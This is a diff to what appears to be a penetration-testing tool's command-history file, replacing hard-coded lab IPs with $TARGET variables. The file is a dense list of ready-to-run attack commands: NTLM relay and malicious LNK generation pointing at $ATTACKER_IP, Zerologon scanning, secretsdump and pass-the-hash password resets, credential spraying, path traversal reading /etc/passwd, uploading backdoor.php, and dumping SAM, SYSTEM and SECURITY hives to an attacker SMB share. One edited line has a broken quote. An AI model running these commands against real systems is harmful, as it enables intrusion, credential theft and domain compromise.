@@ -74,38 +74,38 @@ cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
 privexchange.py -ah "$ATTACKER_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$TARGET"
 neo4j start
 lnk-generate.py --host "$ATTACKER_IP" --type ntlm --output '@SHUTDOWN-LNK.lnk'
-autorecon 192.168.10.10
-nmap --script=ldap-search -p 389 192.168.10.10
-nmap -p 5900 --script=realvnc-auth-bypass 192.168.10.10
-dirb http://192.168.10.10 /usr/share/seclists/Discovery/Web-Content/big.txt
+autorecon "$TARGET"
+nmap --script=ldap-search -p 389 "$TARGET"
+nmap -p 5900 --script=realvnc-auth-bypass "$TARGET"
+dirb "http://$TARGET" /usr/share/seclists/Discovery/Web-Content/big.txt
 gobuster dir -w `fzf-wordlists` -t 20 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi,bak,tar.gz,tgz,zip -u "http://$TARGET/"
-smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
-smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
-smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
-onesixtyone 192.168.10.10 private
-onesixtyone 192.168.10.10 public
-onesixtyone 192.168.10.10 manager
-onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.10.10
-snmpwalk -c public -v 1 192.168.10.10
-snmpwalk -c public -v 2c 192.168.10.10
-cewl --depth 10 --with-numbers --write cewl.txt 192.168.10.10
+smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t "$TARGET"
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t "$TARGET"
+smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t "$TARGET"
+onesixtyone "$TARGET" private
+onesixtyone "$TARGET" public
+onesixtyone "$TARGET" manager
+onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt "$TARGET"
+snmpwalk -c public -v 1 "$TARGET"
+snmpwalk -c public -v 2c "$TARGET"
+cewl --depth 10 --with-numbers --write cewl.txt "$TARGET"
 wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
 wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-detection aggressive
 wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --enumerate u1-20
-nmblookup -A 192.168.10.10
-nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
-smbmap -H 192.168.10.10
-smbmap -u guest -H 192.168.10.10
-smbmap -H 192.168.10.10 -R
-smbmap -H 192.168.10.10 -R test
-smbclient --list 192.168.10.10
-smbclient --no-pass --user '' //192.168.10.10/SYSVOL
-smbclient --no-pass --user '' --list 192.168.10.10
-smbclient.py "$DOMAIN"/user:astrongpassword@192.168.56.201
-nmap --script smb-enum-shares -p 139,445 -T4 -Pn 192.168.10.10
-amap -d 192.168.10.10 4455
-nikto -host 192.168.10.10
-dotdotpwn -m payload -h 192.168.10.10 -x 80 -p request.req -k 'root:' -f /etc/passwd
+nmblookup -A "$TARGET"
+nmap --script 'smb-enum*' --script-args unsafe=1 -T5 "$TARGET"
+smbmap -H "$TARGET"
+smbmap -u guest -H "$TARGET"
+smbmap -H "$TARGET" -R
+smbmap -H "$TARGET" -R test
+smbclient --list "$TARGET"
+smbclient --no-pass --user '' ""//$TARGET/SYSVOL"
+smbclient --no-pass --user '' --list "$TARGET"
+smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+nmap --script smb-enum-shares -p 139,445 -T4 -Pn "$TARGET"
+amap -d "$TARGET" 4455
+nikto -host "$TARGET"
+dotdotpwn -m payload -h "$TARGET" -x 80 -p request.req -k 'root:' -f /etc/passwd
 dotdotpwn -m stdout -d 5 -f /etc/passwd
 kadimus -u "http://$TARGET/?page=file1.php"
 kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u "http://$TARGET/?page=file1.php"
@@ -152,7 +152,7 @@ krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOS
 wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=FUZZ&password=FUZ2Z' -u "http://$TARGET/admin"
 wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic "FUZZ:FUZ2Z" -u "http://$TARGET/secretpage"
 pypykatz lsa minidump lsass.dmp
-enyx 1 public 192.168.10.10
+enyx 1 public "$TARGET"
 wfuzz --hc 403,404 -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u "http://$TARGET/FUZZFUZ2Z"
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
@@ -172,9 +172,9 @@ nmap -sS -p 3268,3269 192.168.56.0/24
 nmap -sC -sV -p 139,445,80,21 192.168.56.201
 nmap -Pn -v -sS -F 192.168.56.0/24
 curl "$TARGET" --upload-file backdoor.php -v
-net rpc password 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
 net rpc user add 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
-pth-net rpc password 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%'ffffffffffffffffffffffffffffffff':"$NT_HASH" -S "$DC_HOST"
+pth-net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%'ffffffffffffffffffffffffffffffff':"$NT_HASH" -S "$DC_HOST"
 zerologon-scan DC01 "$DC_HOST"
 secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
 secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
@@ -326,7 +326,7 @@ faketime '2022-01-31 22:05:35' zsh
 manspider --threads 50 192.168.56.0/24 -d "$DOMAIN" -u "$USER" -H "$NT_HASH" --content administrateur
 gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
 modifyCertTemplate.py -template KerberosAuthentication -get-acl "$DOMAIN"/"$USER":"$PASSWORD"
-smbserver.py -smb2support SHUTDOWN .
+smbserver.py -smb2support EXEGOL .
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
